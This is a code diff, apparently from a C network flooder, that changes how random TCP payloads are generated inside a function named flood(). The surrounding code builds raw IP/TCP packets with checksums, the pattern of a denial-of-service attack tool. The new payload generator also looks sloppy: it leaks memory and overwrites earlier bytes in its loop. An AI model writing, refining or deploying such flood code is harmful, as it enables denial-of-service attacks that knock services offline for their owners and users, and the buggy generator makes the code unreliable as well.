@@ -155,19 +155,27 @@ void setup_tcp_header(struct tcphdr *tcph)
 	memcpy((void *)tcph + sizeof(struct tcphdr), PAYLOAD, sizeof(PAYLOAD) - 1);
 }
 
-char *genPayload(char oldPayload[], size_t size)
+char *genPayload(int size)
 {
-	for (int i = 0; i < randnum(16, size); i++)
+	char *newPayload = (char *)malloc(size * sizeof(char));
+	for (int i = 0; i < size; i++)
 	{
-		for (size_t num = 0; num < size / 2; num++)
+		if (i % 2 == 0)
 		{
-			oldPayload[num] = randnum(1, size);
-			oldPayload[i] = rand_cmwc() % oldPayload[num];
+			for (size_t num = 0; num < (i / 2); num++)
+			{
+				newPayload[num] = randnum(1, size);
+				newPayload[i] = rand_cmwc() % (256 + num);
+			}
+		}
+		else
+		{
+			newPayload[i] = randnum(1, size);
 		}
 	}
 
 	// printf("Payload: %s\n", oldPayload);
-	return oldPayload;
+	return newPayload;
 }
 
 void *flood(void *par1)
@@ -807,12 +815,13 @@ void *flood(void *par1)
 	{
 
 		int randomPayloadLength = randnum(32, 512) - 1;
-		char randomPayload[randomPayloadLength];
+		char *randomPayload = genPayload(randomPayloadLength);
+		/*		char randomPayload[randomPayloadLength];
 
 		for (int i = 0; i < randomPayloadLength; i++)
 		{
 			randomPayload[i] = rand_cmwc() % 256; // Do not change that bruh
-		}
+		}*/
 		memcpy((void *)tcph + sizeof(struct tcphdr), randomPayload, randomPayloadLength);
 		iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + randomPayloadLength;
 		iph->check = csum((unsigned short *)datagram, iph->tot_len);
